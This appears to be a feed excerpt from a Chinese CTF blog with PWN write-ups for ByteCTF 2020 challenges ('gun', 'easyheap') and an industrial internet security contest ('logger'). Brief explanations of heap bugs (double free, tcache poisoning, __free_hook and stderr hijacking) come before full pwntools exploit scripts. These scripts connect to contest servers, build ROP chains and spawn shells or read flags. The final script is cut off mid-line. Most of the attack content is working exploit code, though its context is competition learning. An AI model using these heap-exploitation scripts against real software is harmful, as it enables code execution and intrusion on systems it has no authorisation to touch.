        &lt;h3 id=&quot;ParseC&quot;&gt;&lt;a href=&quot;#ParseC&quot; class=&quot;headerlink&quot; title=&quot;ParseC&quot;&gt;&lt;/a&gt;ParseC&lt;/h3&gt;&lt;p&gt;JIT类型题目。&lt;/p&gt;
&lt;p&gt;有三个函数：read(读取浮点数)、puts（输出字符）、print（输出浮
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020bytectf-WP</title>
    <link href="https://nuoye-blog.github.io/2020/10/25/6ff766d/"/>
    <id>https://nuoye-blog.github.io/2020/10/25/6ff766d/</id>
    <published>2020-10-25T14:00:00.000Z</published>
    <updated>2020-10-26T05:22:08.446Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h3><p>实现了单向的操作，buy是获取堆块，load是将堆块填入，shoot是输出堆块的信息，并进行free。</p><p>首先是leak的，直接unsortbin即可leak出libc地址。</p><p>接着由于shoot的时候没有对对链表清空，所以可以先申请9个fastbin范围的堆块，倒序load再shoot，接着再申请回7个，再将第一个载入，再进行shoot，就会将原本已经在fastbin的堆块再次free，得到double free。接着再将tcache中的7个堆块申请回来，再申请一个即可发现tcache中又存在了3个tcache，并且构成了循环，这样即可达到任意地址申请的目的。</p><p>接着第一步先申请到stdout中，进行修改write的指针到<code>environ</code>附近，从而leak出栈地址。</p><p>接着第二步将地址申请到栈上，劫持返回地址，修改rsp到堆上步骤好的rop串进行orw。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./gun"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.31.so"</span>&#125;)</span><br><span class="line">p = remote(<span class="string">"123.57.209.176"</span>,<span class="string">"30772"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shoot</span><span class="params">(times)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Action&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Shoot time: "</span>)</span><br><span class="line">p.sendline(str(times))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Action&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Which one do you want to load?"</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Action&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Bullet price:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Bullet Name: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your name: "</span>)</span><br><span class="line">p.sendline(<span class="string">"aaa"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">buy(<span class="number">0x88</span>,<span class="string">'1111\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">load(<span class="number">8</span>-i)</span><br><span class="line">shoot(<span class="number">9</span>)</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Pwn! The "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)<span class="number">-0x1EBBE0</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#io leak stack</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">9</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Pwn! The "</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Pwn! The "</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)<span class="number">-0x770</span> <span class="number">-0x50</span></span><br><span class="line">print(hex(heap))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x38</span>,p64(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>])+<span class="string">b'\n'</span>)</span><br><span class="line">print(hex(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]))</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x38</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x38</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.sym[<span class="string">'environ'</span>])+p64(libc.sym[<span class="string">'environ'</span>]+<span class="number">8</span>)+p64(libc.sym[<span class="string">'environ'</span>]+<span class="number">8</span>)+<span class="string">b'\n'</span>)<span class="comment">#write1</span></span><br><span class="line">stack = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)</span><br><span class="line">print(hex(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rsp = <span class="number">0x0000000000032b5a</span> + libc.address</span><br><span class="line">pop_rdi = <span class="number">0x0000000000026b72</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x0000000000027529</span> + libc.address</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011c371</span> + libc.address</span><br><span class="line">pop_rax = <span class="number">0x000000000004a550</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x0000000000122F29</span> + libc.address</span><br><span class="line">ROP1 = p64(pop_rsp)</span><br><span class="line">ROP1 += p64(heap+<span class="number">0xa60</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'flag\x00'</span>.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap+<span class="number">0xa60</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0xa60</span>+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap+<span class="number">0xa60</span>+<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">9</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x18</span>,p64(stack<span class="number">-0x100</span>)+<span class="string">b'\n'</span>)</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x18</span>,<span class="string">'\n'</span>)</span><br><span class="line">buy(<span class="number">0x18</span>,ROP1+<span class="string">b'\n'</span>)</span><br><span class="line">load(<span class="number">2</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">buy(<span class="number">0x200</span>,payload+<span class="string">b'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x1B69)')</span></span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Goodbye!"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h3><p>程序存在逻辑漏洞：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20201025212841.png" alt="image-20201025212841046"></p><p>第一次输入不符合要求的size后也会作为后面写入null字节的偏移量，通过这一漏洞可以修改一个free状态的fd，再在fd对应地址处输入值即可劫持fd，从而申请到任意地址。</p><p>首先通过0x80堆块进行leak，得到libc地址。接着用上述漏洞申请到<code>__free_hook</code>，再将其修改为system，即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./easyheap"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.31.so"</span>&#125;)</span><br><span class="line">p = remote(<span class="string">"123.57.209.176"</span>,<span class="string">"30774"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">-4</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add3</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x91</span>))</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(<span class="number">7</span>-i)</span><br><span class="line">add2(<span class="number">1</span>,<span class="string">'1'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">b'\x00\x00'</span>)<span class="number">-0x1EBC31</span></span><br><span class="line">print(hex(libc.address))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">add(<span class="number">0x80</span>,p64(libc.sym[<span class="string">'__free_hook'</span>])+<span class="string">b'\n'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add3(<span class="number">0x80</span>,<span class="string">'1\n'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'/bin/sh\x00\n'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(libc.sym[<span class="string">'system'</span>])+<span class="string">b'\n'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *$rebase(0x1537)\nb system')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&quot;gun&quot;&gt;&lt;a href=&quot;#gun&quot; class=&quot;headerlink&quot; title=&quot;gun&quot;&gt;&lt;/a&gt;gun&lt;/h
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
      <category term="PWN" scheme="https://nuoye-blog.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>2020年全国工业互联网安全技术技能大赛线上初赛-WP</title>
    <link href="https://nuoye-blog.github.io/2020/10/25/a0d88c21/"/>
    <id>https://nuoye-blog.github.io/2020/10/25/a0d88c21/</id>
    <published>2020-10-25T14:00:00.000Z</published>
    <updated>2020-10-25T13:58:02.326Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h3><p>第一次输入Warning时栈上有残留信息，以此leak出libc地址。</p><p>Warning_once会对0x67f7b0+idx处地址写入一个值（该值为输入data的长度），并且idx未检查，可以输入负数溢出。</p><p>通过劫持stderr到bss上，布置好函数表，退出时会用到stderr，用system调用shell即可。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./logger")</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"39.105.35.195"</span>,<span class="string">"12432"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"logger"</span>).libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Warning1</span><span class="params">(data)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Warning_once1</span><span class="params">(data,idx)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"ID:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">error1</span><span class="params">(data)</span>:</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"4. Exit"</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Content:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">Warning1(<span class="string">"a"</span>*<span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">56</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3A2A9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base +libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#IO</span></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(one_gadget&amp;<span class="number">0xff</span>),<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>),<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>),<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xff</span>),<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*((one_gadget&gt;&gt;<span class="number">40</span>)&amp;<span class="number">0xff</span>),<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Warning_once1("1"*((one_gadget&gt;&gt;48)&amp;0xff),6)</span></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(ord(<span class="string">'s'</span>)),<span class="number">0x10</span>+<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(ord(<span class="string">'h'</span>)),<span class="number">0x10</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning_once1(<span class="string">"1"</span>*(<span class="number">0xc0</span>),<span 